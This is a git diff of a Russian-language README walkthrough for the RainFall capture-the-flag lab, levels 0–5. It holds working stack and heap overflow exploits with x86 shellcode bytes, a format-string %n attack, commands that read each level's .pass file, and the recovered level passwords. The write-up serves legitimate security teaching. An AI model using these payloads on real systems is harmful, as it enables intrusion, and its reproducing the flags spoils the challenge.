@@ -38,8 +38,8 @@ bonu0 bonu1 bonu02 bonu3 end
 | ........................... | ........................... | .................................................................................|........................................................................................................................ |
 | [level0](#lvl0)        | Выявление с помощью gdb подходящего числа для ввода | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
 | [level1](#lvl1)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера ( `gets()` ) и подмена EIP регистра (адрес возврата из функции) на адрес с нужным кодом: <br> - [адрес на system()](#level1_jump_to_system()), <br> - [положить шеллкод на стек и положить в EIP адрес шеллкода на стеке](#level1_shellcode_on_stack), <br> - [положить шеллкод в переменную окружения и положить в EIP адрес этой переменной окружения](#level1_shellcode_in_env) </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
-| [level2](#lvl2)        | при ASLR off [Off-by-One](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/) (на основе кучи), можно также [Use-After-Free](https://habr.com/ru/company/otus/blog/516150/). Использование функции gets() | <p>Работа с кучей. </p> <br> ltrace, getfacl, gdb |  |
-| [level3](#lvl3)        |  |  |  |
+| [level2](#lvl2)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), выделение памяти в куче без освобождения strdup() </p>  | <p>Работа с кучей. </p> <br> Поиск слабого места: gdb; <br>Поиск адреса кучи: ltrace, gdb<br><br>Взлом: переполнение буфера ( gets() ) и подмена EIP регистра (адрес возврата из функции) на адрес кучи. | 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 |
+| [level3](#lvl3)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb |  |
 | [level4](#lvl4)        |  |  |  |
 | [level5](#lvl5)        |  |  |  |
 | [level6](#lvl6)        |  |  |  |
@@ -116,7 +116,7 @@ checksec --file /home/user/level0/level0
           </p>
         <pre> System-wide ASLR (kernel.randomize_va_space): <font class=off>Off (Setting: 0)</font></pre>
           <p>
-            "Этот параметр можно использовать для выбора типа рандомизации адресного пространства процесса. Значения по умолчанию различаются в зависимости от того, поддерживает ли архитектура ASLR, было ли ядро ​​собрано с параметром CONFIG_COMPAT_BRK или нет, или от используемых параметров загрузки ядра.
+            "Этот параметр можно использовать для выбора типа рандомизации адресного пространства процесса. Значения по умолчанию различаются в зависимости от того, поддерживает ли архитектура ASLR, было ли ядро собрано с параметром CONFIG_COMPAT_BRK или нет, или от используемых параметров загрузки ядра.
           </p>
           <ul>
             Возможные настройки:
@@ -209,6 +209,36 @@ $ exit
 level0@RainFall:~$ su level1
 # Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 ```
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+#include "string.h"
+#include "unistd.h"
+#include "stdio.h"
+<br>
+int    main(int argc, char **argv){
+        gid_t           gid;
+        uid_t           uid;
+        char            *array[2];
+
+
+        if (atoi(argv[1]) == 423){
+                array[0] = strdup("/bin/sh");
+                array[1] = NULL;
+                gid = getegid();
+                uid = geteuid();
+                setresgid(gid, gid, gid);
+                setresuid(uid, uid, uid);
+                execv("/bin/sh", array);
+        }
+        else
+                fprintf(stderr, "No !\n");
+        return (0);
+}
+</pre>
+gcc -static -m32 -Wl,-z,norelro -fno-stack-protector исходник_level0.c -o level0
+<br><br><br>
+</details> 
 
 #
 ###### [вернуться к содержанию](#content)
@@ -291,10 +321,10 @@ NX disabled + No canary found + NO PIE + gets(), в которую подан а
  - [В королевстве PWN. Препарируем классику переполнения стека](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html#gdb-peda)    
  - [Создание Эксплойта: Переполнение буфера стека](https://codeby.net/threads/sozdanie-ehksplojta-perepolnenie-bufera-steka.58741/)
 
-gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - \
-[прыгнуть на system()](#level1_jump_to_system()), \
-[положить шеллкод на стек и прыгнуть на адрес шеллкода на стеке](#level1_shellcode_on_stack), \
-[положить шеллкод в переменную окружения и прыгнуть на адрес переменной окружения](#level1_shellcode_in_env)
+gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - 
+1. [переместиться на system()](#level1_jump_to_system())
+2. [положить шеллкод на стек и переместиться на адрес шеллкода на стеке](#level1_shellcode_on_stack)
+3. [положить шеллкод в переменную окружения и переместиться на адрес переменной окружения](#level1_shellcode_in_env)
 
 Общее для всех трех способов взлома - подмена адреса возврата функции (регистр EIP). Подробно об этом ниже.
 
@@ -315,7 +345,7 @@ gdb -batch -ex 'file ./level1' -ex 'disas main'
 # End of assembler dump.
 ```
 <details> 
-  <summary> Анализ disassemble main (не обязательно к прочтению) в развороте: </summary>
+  <summary> Анализ disassemble main в развороте: </summary>
 <br>
 
 создается стековый фрейм (stack frame) или кадр стека: <br>
@@ -367,17 +397,24 @@ gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level
 </details> 
 
 Интересующая строка: \
-`0x08048496 <+22>:    ret  ` инструкция ret верхнее значение стека присваивает регистру eip \
+`0x08048496 <+22>:    ret  ` инструкция ret верхнее значение стека присваивает регистру eip. \
 В соответствии с анализом, приведенным выше, надо переполнить буфер и подать нужный адрес на место, где в стеке размещался бы регистр eip. Ниже это я рассмотрю.
 
-## Разработка эксплоита. Общее для всех трех способов  - прыжок на функцию, исполнение шеллкода на стеке, исполнение шеллкода из переменной окружения:
-1. Расчет смещения EIP (адреса возврата) \
+## Разработка эксплоита. 
+
+## Общее для всех трех способов  - перемещение на функцию, исполнение шеллкода на стеке, исполнение шеллкода из переменной окружения:
+Расчет смещения EIP (адреса возврата) \
 [Воспользуюсь сайтом.](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
 ![Получается так:](./README/level1_buf_overflow.png)
 Нужное смещение 76 байт.
 
+Теперь необходимо решить, на что будет указывать адрес, который будет положен в EIP.
 
-2. Поиск места для подмены адреса возврата:
+
+<a name="level1_jump_to_system()"></a> 
+## _1._ level1: перейти на system()
+
+Поиск места для подмены адреса возврата:
 
 ```sh
 
@@ -396,11 +433,8 @@ disassemble TAB
 # ...
 ```
 
-<a name="level1_jump_to_system()"></a> 
-## level1: перейти на system()
-
-среди функций есть system().
-Если прыгнуть сразу на system(), то оболочка не откроется, так как для открытия оболочки этой функции необходим аргумент `/bin/sh`. Для вызова system() с нужным аргументом нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
+Среди функций есть system().
+Если перейти сразу на system(), то оболочка не откроется, так как для открытия оболочки этой функции необходим аргумент `/bin/sh`. Для вызова system() с нужным аргументом нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
 ```sh
 gdb -batch -ex 'file ./level1' -ex 'disassemble run' | grep system
 # || 
@@ -454,7 +488,7 @@ gdb
 0x0804846d \
 0x08048472 
 
-Я возьму 0x08048472 на строку выше, чем system(): 
+Я возьму сразу 0x08048472 на строку выше, чем system(): 
 ```sh
 #                                       0x08048472
 (echo $(python -c 'print "a" * 76 + "\x72\x84\x04\x08"'); cat) | ./level1
@@ -467,17 +501,19 @@ cat /home/user/level2/.pass
 # \/
 # 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
+Уровень пройден!
 ```sh
 su level2
 # Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
 <a name="level1_shellcode_on_stack"></a> 
-## level1: shellcode на стеке
+## _2._ level1: shellcode на стеке
 
 Для shellcodes мне понравился сайт http://shell-storm.org/ . \
 На нем есть масса полезных статей по кибербезопасности и [готовые shellcodes](http://shell-storm.org/shellcode/index.html).
 
+<a name="shellcode"></a> 
 <details> 
   <summary> Чтобы подобрать подходящий код, я проделала шаги, указанные в развороте: </summary>
 
@@ -575,7 +611,7 @@ gdb level1
 `(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 ` \
 и оболочка не открывается, потому что я не попадаю на шелл код. Это связано с тем, что при запуске в дебаггере и без него адреса немного отличаются (разные переменные окружения, которые кладутся перед кодом программы).
 
-Подбираю правильный адрес на 16*3 байт больше, чтобы попасть на NOP-срез и проскользить до shellcode:
+Подбираю правильный адрес (подошел на 16*3 байт больше), чтобы попасть на NOP-срез и проскользить до shellcode:
 ```sh
 (python -c 'print "A"*76 + "\x70\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 
         whoami
@@ -591,15 +627,15 @@ su level2
 ```
 
 <a name="level1_shellcode_in_env"></a> 
-## level1: shellcode в env
+## _3._ level1: shellcode в env
 
-В [level1: shellcode на стеке](#level1_shellcode_on_stack) я рассматривала, как подобрать подходящий shellcode. Воспользуюсь здесь тем же кодом.
+В [level1: shellcode на стеке](#level1_shellcode_on_stack) я рассматривала, как подобрать подходящий [shellcode](#shellcode). Воспользуюсь здесь тем же кодом.
 
 Создаю переменную окружения:
 ```sh
 export SHELLCODE=$'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'
 ```
-Компилирую и запускаю файл (env_addr.c):
+Компилирую и запускаю файл (env_addr.c) в папке /tmp/:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -613,8 +649,14 @@ int main() {
 ```sh
 gcc /tmp/env_addr.c -o /tmp/env_addr
 level2@RainFall:~$ /tmp/env_addr
-0xbffff868
-
+# ||
+# \/
+# 0xbffff868
+#     |_____________________________
+#                                  ||
+#                                 \  /
+#                                  \/
+#                             0xbffff868
 (python -c 'print "A"*76 + "\x68\xf8\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; echo "cat /home/user/level2/.pass") | ./level1 
 # ||
 # \/
@@ -682,7 +724,12 @@ ltrace ./level2
 # )                                                         = 15
 # strdup(" 12345678Hello")                                                       = 0x0804a008
 # +++ exited (status 8) +++
+```
+Из вывода `ltrace` видно, что используются: \
+`gets()` - можно переполнить буфер,         \
+`strdup()` - в программе выделяется куча (heap), в ней же как и на стеке можно расположить исполняемый код.
 
+```sh
 (gdb) disassemble Tab
 # ||
 # \/
@@ -701,7 +748,7 @@ ltrace ./level2
 #    0x0804854b <+12>:    ret    
 # End of assembler dump.
 ```
-main только вызывает p()
+main вызывает только p()
 
 ```sh
 (gdb) disassemble p
@@ -722,7 +769,6 @@ main только вызывает p()
 #    0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
 #    0x080484fb <+39>:    and    $0xb0000000,%eax
 #    0x08048500 <+44>:    cmp    $0xb0000000,%eax
-# ---Type <return> to continue, or q <return> to quit---
 #    0x08048505 <+49>:    jne    0x8048527 <p+83>
 #    0x08048507 <+51>:    mov    $0x8048620,%eax
 #    0x0804850c <+56>:    mov    -0xc(%ebp),%edx
@@ -738,12 +784,11 @@ main только вызывает p()
 #    0x08048535 <+97>:    mov    %eax,(%esp)
 #    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
 #    0x0804853d <+105>:   leave  
-# ---Type <return> to continue, or q <return> to quit---
 #    0x0804853e <+106>:   ret    
 # End of assembler dump.
 ```
 
-`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` p содержит gets(), в то же время содержит защиту от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (адрес стека):
+`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` p содержит gets(), в то же время содержит защиту от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (также видно из предыдущего уровня, что адрес начинается на 0xb...):
 ```
 0x080484fb <+39>:    and    $0xb0000000,%eax           
 0x08048500 <+44>:    cmp    $0xb0000000,%eax           
@@ -762,59 +807,101 @@ main только вызывает p()
 </details>
 <br>
 
-Для shellcodes мне понравился сайт http://shell-storm.org/ . \
-На нем есть масса полезных статей по кибербезопасности и [готовые shellcodes](http://shell-storm.org/shellcode/index.html).
 
-<details> 
-  <summary> Чтобы подобрать подходящий код, я проделала шаги, указанные в развороте: </summary>
+Создается стековый фрейм (stack frame) или кадр стека:  \
+`0x080484d4 <+0>:     push   %ebp     ` сохраняет в стеке содержимое регистра EBP \
+`0x080484d5 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP   
 
-1. Узнаю ОС:
+Далее:  \
+`0x080484d7 <+3>:     sub    $0x68,%esp` резерв места для локальных переменных функции main 68<sub>16</sub> = 104<sub>10</sub>байт.
+
+...
+
+`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` вызов функции, с помощью которой я переполню буфер
+
+Защита от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (адрес стека):
+`0x080484fb <+39>:    and    $0xb0000000,%eax           ` \
+`0x08048500 <+44>:    cmp    $0xb0000000,%eax           ` \
+`0x08048505 <+49>:    jne    0x8048527 <p+83>           ` \
+`...                                                    ` \
+`0x08048522 <+78>:    call   0x80483d0 <_exit@plt>      `
+
+Стек и env для вредоносного кода использовать не получится, зато можно использовать кучу:
+
+Далее вызов `strdup()` с выделением памяти на куче. И не происходит освобождения памяти, возвращенной функцией `strdup()`, то есть в main вернется указатель на кучу, где и будет положен shellcode:
+`0x08048538 <+100>:   call   0x80483e0 <strdup@plt> `
+`0x0804853d <+105>:   leave                         `
+`0x0804853e <+106>:   ret                           `
+
+Посмотреть адрес, возвращенный strdup() можно 3 способами:
+
+1. 
 ```sh
-uname -a
+ltrace ./level2 
 # ||
 # \/
-# Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 i686 i386 GNU/Linux
+# __libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
+# fflush(0xb7fd1a20)                                                             = 0
+# gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5 12345678Hello
+# )                                  = 0xbffff5fc
+# puts(" 12345678Hello" 12345678Hello
+# )                                                         = 15
+# strdup(" 12345678Hello")                                                       = 0x0804a008
 ```
-В данном случае 32-разрядная ОС.
-
-2. Теперь надо узнать информацию об архитектуре CPU:
-
+2. 
 ```sh
-lscpu
+(gdb) disassemble  p
 # ||
 # \/
-# Architecture:          i686
-# CPU op-mode(s):        32-bit, 64-bit
-# Byte Order:            Little Endian
-# CPU(s):                1
-# On-line CPU(s) list:   0
-# Thread(s) per core:    1
-# Core(s) per socket:    1
-# Socket(s):             1
-# Vendor ID:             GenuineIntel
-# CPU family:            6
-# Model:                 55
-# Stepping:              8
-# CPU MHz:               2163.246
-# BogoMIPS:              4326.49
-# Virtualization:        VT-x
-# L1d cache:             24K
-# L1i cache:             32K
-# L2 cache:              1024K
+# Dump of assembler code for function p:
+#    0x080484d4 <+0>:     push   %ebp
+# ...
+#    0x08048535 <+97>:    mov    %eax,(%esp)
+#    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+#    0x0804853d <+105>:   leave  
+#    0x0804853e <+106>:   ret    
+# End of assembler dump.
+(gdb) b *0x0804853d
+(gdb) r
+(gdb) info registers
+# ||
+# \/
+# eax            0x804a008        134520840
+# ...
+# ...
+
 ```
-Значит, мне нужен код для:  \
-Linux 32-bit                \
-Intel/x86                   \
-Этот код будет содержать execve() - запуск оболочки. <br>
-<br>
-Я выбрала:                  \
-`||`                        \
-`\/`                        \
-Intel x86                   \
-Sauder                      \
-Linux/x86 - execve() Diassembly Obfuscation Shellcode - 32 bytes by BaCkSpAcE
-<br><br><br>
-</details> 
+3.
+```sh
+(gdb) disassemble main
+# ||
+# \/
+# Dump of assembler code for function main:
+#    0x0804853f <+0>:     push   %ebp
+#    0x08048540 <+1>:     mov    %esp,%ebp
+#    0x08048542 <+3>:     and    $0xfffffff0,%esp
+#    0x08048545 <+6>:     call   0x80484d4 <p>
+#    0x0804854a <+11>:    leave  
+#    0x0804854b <+12>:    ret    
+# End of assembler dump.
+(gdb) b *0x0804854a
+(gdb) r
+(gdb) info registers
+# ||
+# \/
+# eax            0x804a008        134520840
+...
+...
+
+
+```
+Адрес кучи `0x804a008` .
+
+Узнаю смещение адреса возврата функции. Добиваю буфер до нужного размера переполнения (shellcode + NOP-срезы) + адрес кучи.
+
+![Смещение:](./README/level2_buf_overflow.png)
+
+В этом задании я буду использовать тот же shellcode, что и на предыдущем уровне ([shellcode из level1](#shellcode)).
 
 ```sh
 # http://shell-storm.org/shellcode/files/shellcode-237.html
@@ -837,6 +924,7 @@ cat /home/user/level3/.pass
 su level3
 # Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
 <pre>
@@ -868,60 +956,874 @@ int  main(int argc, char **argv) {
 gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level2.c -o level2
 </details> 
 
-Уязвимость Use-After-Free
-https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
 
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl3"></a> 
 # level3
 
+<!-- <pre>
+level0@RainFall:~$ su level3
+<font color=grey>Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02</font>
+
+RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level3/level3</font>
+</pre> -->
+
+![level3](./README/level3.png)
+
+```sh
+
+ls -la
+# ||
+# \/
+# ...
+# -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
+
+./level3 
+# ||
+# \/
+# 
+
+./level3 12345
+# ||
+# \/
+# 
+
+./level3 
+# 12345
+# ||
+# \/
+# 12345
+
+getfacl level3 
+# ||
+# \/
+# # file: level3
+# # owner: level4        !!!!!!!!!!!!!!!
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:level3:r-x
+# user:level4:r-x
+# group::---
+# mask::r-x
+# other::---
+
+ltrace ./level3 
+# 12345
+# ||
+# \/
+# __libc_start_main(0x804851a, 1, 0xbffff6f4, 0x8048530, 0x80485a0 <unfinished ...>
+# fgets(12345
+# "12345\n", 512, 0xb7fd1ac0)                                    = 0xbffff440
+# printf("12345\n"12345
+# )                                                    = 6
+# +++ exited (status 0) +++
+
+
+(gdb) disassemble 
+# ||
+# \/
+# ...
+# m
+# main
+# v
+# fgets
+# printf
+# system
+# fwrite                     
+...
+
+(gdb) disassemble m
+# ||
+# \/
+# No function contains specified address.
+```
+Значит, `m` - это глобальная переменная <a name="lvl3_m"></a> 
+```sh
+(gdb) x &m
+# ||
+# \/
+# 0x804988c <m>:  0x00000000
+
+(gdb) disassemble main
+# ||
+# \/
+# Dump of assembler code for function main:
+#    0x0804851a <+0>:     push   %ebp
+#    0x0804851b <+1>:     mov    %esp,%ebp
+#    0x0804851d <+3>:     and    $0xfffffff0,%esp
+#    0x08048520 <+6>:     call   0x80484a4 <v>
+#    0x08048525 <+11>:    leave  
+#    0x08048526 <+12>:    ret    
+# End of assembler dump.
+```
+<details> 
+  <summary> Анализ disassemble main в развороте: </summary>
+
+___
+
+создается стековый фрейм (stack frame) или кадр стека: \
+`0x0804851a <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
+`0x0804851b <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
+`0x0804851d <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.
+
+`0x08048520 <+6>:     call   0x80484a4 <v>` вызов функции `v()`
+
+Далее завершение и возврат из функции `main()`: \
+`0x08048525 <+11>:    leave ` \
+`0x08048526 <+12>:    ret `   
+
+Анализ disassemble main завершен.
+___
+</details> 
+
+Из анализа видно, что в `main()` только вызов функции `v()` происходит.
+
+Коротко о disassemble `v()`:
+
+Внутри `v()` вызываются функции: \
+`fgets` \
+`printf` \
+`system` \
+`fwrite  `  \
+и глобальная переменная: \
+`m`
+
+`fgets()` защищенная функция, значит с ее помощью не удастся переполнить буфер.
+Слабые места: `system()` и `printf()`.
+
+Поиск уязвимости printf() в google.com: \
+"printf уязвимость" -> ["Такой тип уязвимости называют атакой на строку форматирования (англ. Format string attack)"](https://ru.wikipedia.org/wiki/Printf).
+
+Таким образом необходимо подать правильные аргументы для `printf()`, чтобы переместиться на `system()`.
+
+<details> 
+  <summary> Анализ disassemble v() в развороте: </summary>
+
+___
+
+1. создается стековый фрейм (stack frame) или кадр стека: \
+`0x080484a4 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
+`0x080484a5 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
+`0x080484a7 <+3>:     sub    $0x218,%esp` выделяется 218<sub>16</sub> = 536<sub>10</sub> байт под локальные переменные.
+```sh
+# в gdb disassemble это выглядит так:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp       x $ebp    -->    0xbffff628:     0xbffff638
+                                               esp был 0xbffff628 (in esp 0xbffff638 - start v())
+   0x080484a7 <+3>:     sub    $0x218,%esp     после "0x080484a7 <+3>" регистр "esp" стал 628-218 = 0xbffff410
+```
+
+2. Подготовка к вызову `char *fgets(char *str, int num, FILE *stream)`: 
+
+`0x080484ad <+9>:     mov    0x8049860,%eax` в качестве `FILE *stream` в `fgets()` передано `0` (`stdin`).
+```sh
+(gdb) x *0x8049860
+# ||
+# \/
+# 0xb7fd1ac0 <_IO_2_1_stdin_>:    0xfbad2088
+```
+
+`0x080484b2 <+14>:    mov    %eax,0x8(%esp)` кладу значение `stdin` в `0x8(%esp)` \
+`0x080484b6 <+18>:    movl   $0x200,0x4(%esp)` кладу размер буфера 200<sub>16</sub> = 512<sub>10</sub> байт в `0x4(%esp)` \
+`0x080484be <+26>:    lea    -0x208(%ebp),%eax` кладу в регистр `%eax` указатель на буфер в 512<sub>10</sub> байт и два вышеуказанных значения для передачи в `fgets()` \
+`0x080484c4 <+32>:    mov    %eax,(%esp)` \
+`0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>` вызов функции `fgets()`
+
+```sh
+# в gdb disassemble стек выглядит так:
+0x080484ad <+9>:  mov  0x8049860,%eax     | x $eax --> 0xb7fd1ac0 <_IO_2_1_stdin_>:  ||
+                                          |            0xfbad2088                    \/
+                                          |                                      x/64xw $esp
+0x080484b2 <+14>: mov  %eax,0x8(%esp)     | 0xbffff410:  0xb7fde612  0xb7ffeff4  0xb7fd1ac0  0xb7ff37d0
+                                          | 
+                                          |                          x/64xw $esp
+0x080484b6 <+18>: movl  $0x200,0x4(%esp)  | 0xbffff410:  0xb7fde612  0x00000200  0xb7fd1ac0  0xb7ff37d0
+                                          | 
+0x080484be <+26>: lea  -0x208(%ebp),%eax  | x $eax    -->    0xbffff420:  0x00000000
+                                          | 
+                                          |              x/64xw $esp
+0x080484c4 <+32>: mov  %eax,(%esp)        | 0xbffff410:  0xbffff420  0x00000200  0xb7fd1ac0  0xb7ff37d0
+                                          |                                                      |
+(gdb) x 0xb7ff37d0       <------------------------------------------------------------------------
+# ||                                      |
+# \/                                      |
+# 0xb7ff37d0 <__libc_memalign+16>: 0xb824c381
+#                                         |                                                 выравнивание
+# Выравнивание до 16 байт:                |                                                  до 16 байт
+                                          | 0xbffff410:  0xbffff420  0x00000200  0xb7fd1ac0  0xb7ff37d0
+
+0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>     вызов fgets()
+AAAA
+
+возвращает AAAA в eax, а eax был на стеке <+32> в 0xbffff420:     0x41414141
+``` 
+
+3. Подготовка к вызову `printf()`:
+
+`0x080484cc <+40>:    lea    -0x208(%ebp),%eax`      x $eax  ebp(628)-208=420  -->    0xbffff420:  0x41414141 \
+                                                     буфер передается в качестве аргумента для printf()       \
+`0x080484d2 <+46>:    mov    %eax,(%esp)` \
+`0x080484d5 <+49>:    call   0x8048390 <printf@plt>` вызов функции `printf()`
+
+4. 0x080484e2 <+62> сравнение `m` со значением 64:
+
+Подготовка для сравнения:
+
+`0x080484da <+54>:    mov    0x804988c,%eax` положили значение глобальной переменной (это 0) в регистр `eax`
+```sh
+(gdb) x 0x804988c
+# ||
+# \/
+# 0x804988c <m>:  0x00000000
+```
+`0x080484df <+59>:    cmp    $0x40,%eax` сравниваем `m` и `40`<sub>16</sub>=`64`<sub>10</sub>`
+`0x080484e2 <+62>:    jne    0x8048518 ` если `m` не равно `64`, то переходим к `0x08048518 <+116>:   leave` - это завершение функцию `v()`, потом `main()` и выход из программы.
+
+Если же значение совпали, то в дальнейшем будет произведены подготовка (`0x0804850c <+104>`) и вызов `system()` (`0x08048513 <+111>`):
+
+Анализ disassemble v() завершен.
+___
+
+</details> 
+
+Пробую `printf()` на уязвимость. \
+Безопасное использование функции: `printf("%s", string);` \
+[Уязвимое использование функции](https://habr.com/ru/company/pvs-studio/blog/137411/): `printf(string);`
+
+```sh
+echo "%p %p %p" | ./level3 
+# ||
+# \/
+# 0x200 0xb7fd1ac0 0xb7ff37d0
+```
+
+Значит, при написании программы использовался уязвимый вариант `printf()`.
+
+```sh
+echo "AAAA %p %p %p %p %p %p %p %p " | ./level3 
+# ||
+# \/
+#  ____________________________________
+# ||                                  ||
+# \/                                  \/
+# AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 
+```
+Вместо `AAAA` подставляю адрес глобальной переменной `m` ([выше я его узнала с помощью дебаггера](#lvl3_m)) `\x8c\x98\x04\x08`
+```sh
+echo -e "\x8c\x98\x04\x08 %p %p %p %p " | ./level3 
+# ||
+# \/
+# �                200 0xb7fd1ac0 0xb7ff37d0 0x804988c 
+# \x8c\x98\x04\x08  %p      %p        %p        %p 
+# 0                  1       2         3         4
+# наша глобальная переменная m под номером 4. Значит %4$n
+```
+
+Теперь с [помощью модификатора](https://www.opennet.ru/man.shtml?topic=printf&category=3&russian=0) `%n` перезаписываю значение `m`.
+```sh
+(echo $(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'); cat) | ./level3
+# ||
+# \/
+# �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Wait what?!
+cat /home/user/level4/.pass
+# ||
+# \/
+# b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+Уровень пройден!
+```sh
+su level4
+# Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "string.h"
+
+int m;
+
+void  v(void) {
+
+    char b[512];
+
+    fgets(b, sizeof(b), stdin);
+    printf(b);
+    if(m == 64) {
+            fprintf(stdout ,"Wait what?!\n");
+            system("/bin/sh");
+    }
+}
+
+int   main(int argc, char **argv) {
+
+    v();
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl4"></a> 
 # level4
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "string.h"
+#define FILE_PASS "/bin/cat /home/user/level5/.pass"
+
+int m;
+
+void  p(char *string) {
+
+    printf(string);
+
+}
+
+void  n(void) {
+
+    char  b[512];
+
+    fgets(b, sizeof(b), stdin);
+    p(b);
+    if(m == 0x01025544) {
+
+            system(FILE_PASS);
+
+    }
+
+}
+
+int main(int argc, char **argv) {
+
+    n();
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
 
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl5"></a> 
 # level5
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "string.h"
+
+int m;
+
+void  o(void) {
+
+    system("/bin/sh");
+    _exit(1);
+
+}
+
+void  n(void){
+
+    char b[512];
